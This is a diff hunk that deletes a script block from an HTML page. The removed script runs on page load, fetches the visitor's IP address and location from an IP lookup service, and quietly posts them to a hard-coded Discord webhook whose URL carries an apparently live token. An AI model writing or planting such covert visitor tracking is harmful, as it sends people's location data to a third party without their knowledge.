@@ -30,42 +30,4 @@
 </html> 
 
 
-<script>
-  function displayIpInfo() {
-    // Replace with your API URL
-    const apiUrl = "https://ipapi.co/json/";
 
-    fetch(apiUrl)
-      .then(response => response.json())
-      .then(data => {
-        // Update the table cells with the IP information
-        document.querySelector("#ip-address").textContent = data.ip;
-        document.querySelector("#ip-location").textContent =
-          data.city + ", " + data.region + ", " + data.country_name;
-        document.querySelector("#ip-timezone").textContent = data.timezone;
-
-        // Send the IP information to the Discord webhook
-        sendToDiscord(data.ip, data.city, data.region, data.country_name, data.timezone);
-      });
-  }
-
-  function sendToDiscord(ip, city, region, country, timezone) {
-    // Replace with your Discord webhook URL
-    const webhookUrl = "https://discord.com/api/webhooks/1071627860537774151/wWJaV9sRRVFzeIpRUkBUDjpoPV4lB9FszjwMPLkOR2uwsNtQRUXoqJluLeVTX_G6OjL5";
-
-    // Create the message payload
-    const payload = {
-      content: `New visitor: IP: ${ip}, Location: ${city}, ${region}, ${country}, Time Zone: ${timezone}`
-    };
-
-    // Send the message to the Discord webhook
-    fetch(webhookUrl, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    });
-  }
-
-  // Call the displayIpInfo function when the page loads
-  window.onload = displayIpInfo;
-</script>
